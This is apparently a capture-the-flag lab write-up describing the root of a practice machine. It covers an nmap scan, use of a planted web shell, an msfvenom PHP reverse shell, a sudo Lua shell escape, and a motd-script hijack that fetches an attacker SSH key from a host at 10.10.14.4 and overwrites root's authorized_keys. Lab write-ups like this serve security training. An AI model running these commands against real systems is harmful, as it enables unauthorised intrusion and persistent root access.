As always, we start with nmap - it comes back with ports 80 and 22 open, so naturally we go check out the web page.

Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-09 12:10 EDT
Nmap scan report for 10.10.10.181
Host is up (0.036s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

![websiteLanding](https://github.com/DefinitelyNotDex/imageURLgoesHere)

Initially, my assumption was to jump into dirb or gobuster and try to enumerate where the mentioned backdoor might be, but that doesn't get us anything here.
Instead, hitting 'view page source' gives us this comment:

![websiteComment](https://github.com/DefinitelyNotDex/imageURLgoesHere)

If we google that phrase we get a Github page where the author is the same user who owned the site. 
Scrolling down the list of web shells, we can throw all of them into the end of the URL until one works for us.
If we also click on the Github link for that particular shell we get a set of default creds, which work nicely.

![webShell](https://github.com/DefinitelyNotDex/imageURLgoesHere)

Wonderful, we have a web shell. This shell is fully functional and you can use it to priv-esc to the actual user with minimal issues. I didn't want to deal with it, though, so I compiled my own php shell with msfvenom, uploaded it, set up a metasploit handler to catch the connection, accessed my shell url, and used that shell going forward:

**msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php**

Once we have this shell, time to enumerate. You can do this manually, but to save time I used the linux enumeration script found [here](https://github.com/diego-treitos/linux-smart-enumeration), using wget to download the script directly to the machine:

**wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh**

Running that script shows us that we have a command we're allowed to run as sudo, /home/sysadmin/luvit. If we also take a look at our home directory we have a file called note.txt which explains the sysadmin left us a way to mess around with lua, which is presumably that file. We can run the file with the following command:

**sudo -u sysadmin /home/sysadmin/luvit**

Running it, however, gets us an error. Specifically, we get a *traceback* error that the script tries to call a method that doesn't exist. Going by the name of the machine, we're on the right track.

![luvitError](https://github.com/DefinitelyNotDex/imageURLgoesHere)

Combing that output from the traceback might not give you much at first glance, but when I tried to throw the output of running luvit into a text file I noticed the error message was not included. What was included at the end of the file was a carrot character, which indicated to me that this might be the lua interpreter, similar to the python interpreter. Therefore, we might be able to pass it a command or script, which ended up working. I used [this](https://justhack.in/shell-escapes-cheatsheet) link to grab a very easy shell escape script, which I uploaded to the host, appended with the same luvit command, and ran:

**sudo -u sysadmin /host/sysadmin/luvit shell.lua**

This got me a functional bash shell for the sysadmin user, but it was still coming through the webadmin user's meterpreter shell, which was a pain. I generated a second shell, this time just a standard linux reverse tcp meterpreter shell, uploaded it, created a new handler to catch the shell, and ran it as the sysadmin user to get a sysadmin meterpreter shell.

Now we have an actual user shell and can grab the user flag. 
Running the same linux enumeration script we used above shows that we can access and *write* to the /etc/.update-motd.d/ files, which are bash scripts that generate the welcome message when someone ssh's into the server. There is a script on this box that constantly overwrites them with the defaults, so we'll have to be fast when we use those to priv esc to root. To do so, we'll have to modify them, then immediately ssh into this host in order for the .update-motd.d script to run. 

Going back to the initial webadmin shell, we are able to navigate to /home/webadmin/.ssh and edit the authorized_keys file, which is the file that stores the public ssh key. We can then ssh back to the host as webadmin using the corresponding private key.

To do this, I used ssh-keygen to create the key pair on my local kali machine, dropped the public key into /home/webadmin/.ssh, and copied its contents into the authorized_keys file. Once that was done, I tested that I was able to ssh to the host as webadmin, and we're ready to exploit the .update-motd.d scropt. 

Since the etc/.upload-motd.d files are quickly overwritten (they're maybe there for 5-15 seconds before going back to the original set) I couldn't upload a reverse shell, as it would die rather quickly. What we can do as root, though, is add another set of ssh keys so we can just ssh to the box as root. To do so, we need to replace the motd file and ssh into the box as webadmin to execute the script before it is overwritten. Multiple shell windows queued and ready to go helps here. I hosted the directory with the ssh keys using python's SimpleHTTPServer, and grabbed them with the bash script that we replaced the motd header with:

Local machine (from the directory with the bash script '00-header' inside):
**python -m SimpleHTTPServer 80**

Bash script:
**#!/bin/sh
wget http://10.10.14.4/root-key-rsa.pub -P /root/.ssh
cat /root/.ssh/root-key-rsa.pub > /root/.ssh/authorized_keys**

Sysadmin shell:
**meterpreter>upload 00-header /etc/.update-motd.d/00-header
meterpreter> cat 00-header**
(that cat is to confirm 00-header is the correct file and hasn't been immediately overwritten)

Local machine (separate shell window)
**ssh -i ./webadmin-rsa-key webadmin@10.10.10.181**

As long as the sysadmin shell command and the ssh command were done closely enough together and in sequence, the root ssh key overwrite works well. Now we can just ssh back to the host as root using that new ssh key, grab the root flag, and finish this box off entirely

**ssh -i ./root-key-rsa root@10.10.10.181**
